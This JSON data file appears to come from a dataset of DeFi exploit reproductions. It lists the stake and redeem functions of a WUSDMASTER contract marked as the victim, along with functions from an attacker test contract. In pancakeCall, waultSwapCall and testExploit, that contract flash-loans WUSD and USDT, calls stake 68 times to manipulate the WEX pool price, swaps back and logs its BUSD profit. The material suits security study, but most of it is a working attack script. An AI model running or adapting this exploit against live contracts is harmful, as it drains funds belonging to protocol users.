[
  {
    "contract/interface": "WUSDMASTER",
    "source_type": "victim_contract",
    "function_name": "maxStakeAmount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "WUSDMASTER",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "    function redeem(uint256 amount) external nonReentrant {\n        uint256 usdtTransferAmount = amount * (1000 - wexPermille - treasuryPermille) / 1000;\n        uint256 usdtTreasuryAmount = amount * treasuryPermille / 1000;\n        uint256 wexTransferAmount = wex.balanceOf(address(this)) * amount / wusd.totalSupply();\n        wusd.burn(msg.sender, amount);\n        usdt.safeTransfer(treasury, usdtTreasuryAmount);\n        usdt.safeTransfer(msg.sender, usdtTransferAmount);\n        wex.safeTransfer(msg.sender, wexTransferAmount);\n        \n        emit Redeem(msg.sender, amount);\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "WUSDMASTER",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "    function stake(uint256 amount) external nonReentrant {\n        require(amount <= maxStakeAmount, 'amount too high');\n        usdt.safeTransferFrom(msg.sender, address(this), amount);\n        if(feePermille > 0) {\n            uint256 feeAmount = amount * feePermille / 1000;\n            usdt.safeTransfer(treasury, feeAmount);\n            amount = amount - feeAmount;\n        }\n        uint256 wexAmount = amount * wexPermille / 1000;\n        usdt.approve(address(wswapRouter), wexAmount);\n        wswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            wexAmount,\n            0,\n            swapPath,\n            address(this),\n            block.timestamp\n        );\n        wusd.mint(msg.sender, amount);\n        \n        emit Stake(msg.sender, amount);\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        USDT.approve(address(Master), type(uint256).max);\n        USDT.approve(address(Router), type(uint256).max);\n        // USDT to WEX\n        USDTToWEX();\n        // stake to change Pair\n        uint256 stakeAmout = 250_000 * 1e18;\n        // Master.maxmaxStakeAmount();\n        for (uint256 i = 0; i < 68; i++) {\n            Master.stake(stakeAmout);\n        }\n        // WEX to USDT\n        WEX.approve(address(Router), type(uint256).max);\n        WEXToUSDT();\n        USDT.transfer(address(Pair2), 40_121_000 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 9_728_755);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // borrow WUSD\n        Pair1Amount = WUSD.balanceOf(address(Pair1)) - 1;\n        Pair1.swap(Pair1Amount, 0, address(this), new bytes(1));\n\n        // WUSD to BUSD\n        WUSD.approve(address(Router), type(uint256).max);\n        WUSDToBUSD();\n\n        emit log_named_decimal_uint(\"Attacker BUSD profit after exploit\", BUSD.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "waultSwapCall",
    "original_code": "    function waultSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        WUSD.approve(address(Master), type(uint256).max);\n        // WUSD to USDT, WEX\n        Master.redeem(WUSD.balanceOf(address(this)));\n        Pair2.swap(40_000_000 * 1e18, 0, address(this), new bytes(1));\n        WUSD.transfer(address(Pair1), Pair1Amount * 10_000 / 9975 + 1000);\n    }\n\n",
    "description": ""
  }
]